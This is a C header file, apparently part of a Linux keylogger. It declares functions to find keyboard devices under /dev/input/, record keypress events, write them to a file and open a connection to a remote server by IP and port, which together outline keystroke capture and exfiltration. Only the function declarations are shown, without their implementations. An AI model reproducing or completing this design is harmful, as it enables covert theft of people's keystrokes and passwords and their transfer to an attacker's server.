#ifndef KEYLOGGER
#define KEYLOGGER

#define MAX_EVENTS 3
#define KEY_PRESSED 1
#define KEY_RELEASED 0
#define KEY_REPEATED 2
#define PATH "/dev/input/"
typedef struct input_event event;

void startKeylogger(int keyboard, int fd_out);
int *findKeyboards(char * path, int *num_keyboards);
int findRealKeyboard(int *keyboards, int num_keyboards, int timeout, int * keyboard);
int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write);
int isKeyboardDevice(int fd);
void sigHandler(int signum);
int openConnectionWithServer(char*ip, short port);

#endif